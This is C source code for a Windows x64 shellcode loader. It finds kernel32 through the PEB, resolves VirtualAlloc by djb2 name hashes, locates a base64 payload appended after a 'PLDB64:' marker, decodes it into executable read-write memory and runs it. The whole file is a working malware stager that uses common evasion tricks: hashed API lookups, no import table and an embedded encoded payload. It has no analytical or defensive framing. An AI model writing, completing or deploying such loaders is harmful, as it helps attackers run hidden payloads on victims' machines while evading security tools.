#include <stdint.h>

// Forward declarations
void loader_main();

// The entry point must be the first function in the .text section
void entry() {
    loader_main();
}

#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

typedef struct _UNICODE_STRING {
    unsigned short Length;
    unsigned short MaximumLength;
    uint16_t* Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _PEB_LDR_DATA {
    unsigned int Length;
    unsigned int Initialized;
    void* SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    unsigned char Reserved1[2];
    unsigned char BeingDebugged;
    unsigned char Reserved2[1];
    void* Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    unsigned int SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _IMAGE_DOS_HEADER {
    uint16_t e_magic;
    uint16_t e_cblp;
    uint16_t e_cp;
    uint16_t e_crlc;
    uint16_t e_cparhdr;
    uint16_t e_minalloc;
    uint16_t e_maxalloc;
    uint16_t e_ss;
    uint16_t e_sp;
    uint16_t e_csum;
    uint16_t e_ip;
    uint16_t e_cs;
    uint16_t e_lfarlc;
    uint16_t e_ovno;
    uint16_t e_res[4];
    uint16_t e_oemid;
    uint16_t e_oeminfo;
    uint16_t e_res2[10];
    int32_t  e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    uint32_t VirtualAddress;
    uint32_t Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    uint16_t Magic;
    uint8_t  MajorLinkerVersion;
    uint8_t  MinorLinkerVersion;
    uint32_t SizeOfCode;
    uint32_t SizeOfInitializedData;
    uint32_t SizeOfUninitializedData;
    uint32_t AddressOfEntryPoint;
    uint32_t BaseOfCode;
    uint64_t ImageBase;
    uint32_t SectionAlignment;
    uint32_t FileAlignment;
    uint16_t MajorOperatingSystemVersion;
    uint16_t MinorOperatingSystemVersion;
    uint16_t MajorImageVersion;
    uint16_t MinorImageVersion;
    uint16_t MajorSubsystemVersion;
    uint16_t MinorSubsystemVersion;
    uint32_t Win32VersionValue;
    uint32_t SizeOfImage;
    uint32_t SizeOfHeaders;
    uint32_t CheckSum;
    uint16_t Subsystem;
    uint16_t DllCharacteristics;
    uint64_t SizeOfStackReserve;
    uint64_t SizeOfStackCommit;
    uint64_t SizeOfHeapReserve;
    uint64_t SizeOfHeapCommit;
    uint32_t LoaderFlags;
    uint32_t NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    uint32_t Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    uint32_t Characteristics;
    uint32_t TimeDateStamp;
    uint16_t MajorVersion;
    uint16_t MinorVersion;
    uint32_t Name;
    uint32_t Base;
    uint32_t NumberOfFunctions;
    uint32_t NumberOfNames;
    uint32_t AddressOfFunctions;
    uint32_t AddressOfNames;
    uint32_t AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

static inline uint32_t hash_a(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static inline uint32_t hash_w(const uint16_t* str, uint32_t len) {
    uint32_t hash = 5381;
    // len is in bytes
    for (uint32_t i = 0; i < len / 2; i++) {
        uint16_t c = str[i];
        if (c >= 'A' && c <= 'Z') c += 32;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

static inline void* get_module_base(uint32_t module_hash) {
    PEB* peb;
    __asm__("mov %%gs:0x60, %0" : "=r"(peb));

    LIST_ENTRY* head = &peb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* next = head->Flink;

    while (next != head) {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)next;
        if (hash_w(entry->BaseDllName.Buffer, entry->BaseDllName.Length) == module_hash) {
            return entry->DllBase;
        }
        next = next->Flink;
    }
    return 0;
}

static inline void* get_proc_address(void* module_base, uint32_t func_hash) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)module_base;
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)((uint8_t*)module_base + dos_header->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)((uint8_t*)module_base + nt_headers->OptionalHeader.DataDirectory[0].VirtualAddress);

    uint32_t* names = (uint32_t*)((uint8_t*)module_base + export_dir->AddressOfNames);
    uint32_t* functions = (uint32_t*)((uint8_t*)module_base + export_dir->AddressOfFunctions);
    uint16_t* ordinals = (uint16_t*)((uint8_t*)module_base + export_dir->AddressOfNameOrdinals);

    for (uint32_t i = 0; i < export_dir->NumberOfNames; i++) {
        char* name = (char*)((uint8_t*)module_base + names[i]);
        if (hash_a(name) == func_hash) {
            return (void*)((uint8_t*)module_base + functions[ordinals[i]]);
        }
    }
    return 0;
}

// Base64 decoding
static inline int base64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static inline uint32_t base64_decode(const char* in, uint32_t in_len, uint8_t* out) {
    uint32_t i = 0, j = 0;
    int v[4];
    while (i < in_len) {
        for (int k = 0; k < 4; k++) {
            if (i < in_len && in[i] != '=') {
                v[k] = base64_decode_char(in[i++]);
            } else {
                v[k] = -1;
                if (i < in_len && in[i] == '=') i++;
            }
        }

        if (v[0] != -1 && v[1] != -1) {
            out[j++] = (uint8_t)((v[0] << 2) | (v[1] >> 4));
        }
        if (v[1] != -1 && v[2] != -1) {
            out[j++] = (uint8_t)(((v[1] & 0x0F) << 4) | (v[2] >> 2));
        }
        if (v[2] != -1 && v[3] != -1) {
            out[j++] = (uint8_t)(((v[2] & 0x03) << 6) | v[3]);
        }
        if (v[3] == -1) break;
    }
    return j;
}

typedef void* (*VirtualAlloc_t)(void*, size_t, uint32_t, uint32_t);

void loader_main() {
    // Hashes (calculated)
    // kernel32.dll hash: 0x7040ee75 (djb2 "kernel32.dll" lowercase)
    // VirtualAlloc hash: 0x382c0f97 (djb2 "VirtualAlloc")

    uint32_t h_kernel32 = 0x7040ee75;
    uint32_t h_VirtualAlloc = 0x382c0f97;

    void* k32 = get_module_base(h_kernel32);
    if (!k32) return;

    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)get_proc_address(k32, h_VirtualAlloc);
    if (!pVirtualAlloc) return;

    // Get current RIP to search for payload
    uint8_t* ptr;
    __asm__("lea (%%rip), %0" : "=r"(ptr));

    // Search for marker "PLDB64:"
    const char marker[] = {'P', 'L', 'D', 'B', '6', '4', ':', 0};
    uint8_t* payload_b64 = 0;

    // Search up to 16KB ahead
    for (uint32_t i = 0; i < 0x4000; i++) {
        int match = 1;
        for (int m = 0; marker[m]; m++) {
            if (ptr[i+m] != marker[m]) {
                match = 0;
                break;
            }
        }
        if (match) {
            payload_b64 = ptr + i + 7;
            break;
        }
    }

    if (!payload_b64) return;

    // Determine payload size by searching for end of blob or a space
    // Since we appended it to the bin, we might not have a null terminator in the file,
    // but the memory might have one or we can use another marker for the end.
    // For this implementation, we'll assume it's followed by a null or we reached 0x10000 chars.
    uint32_t b64_len = 0;
    while (b64_len < 0x10000 && payload_b64[b64_len] &&
           payload_b64[b64_len] != ' ' &&
           payload_b64[b64_len] != '\r' &&
           payload_b64[b64_len] != '\n') {
        b64_len++;
    }

    if (b64_len == 0) return;

    uint32_t alloc_size = (b64_len * 3) / 4 + 1;
    void* exec_mem = pVirtualAlloc(0, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return;

    uint32_t decoded_size = base64_decode((const char*)payload_b64, b64_len, (uint8_t*)exec_mem);

    // Execute the decoded payload
    if (decoded_size > 0) {
        ((void(*)())exec_mem)();
    }
}
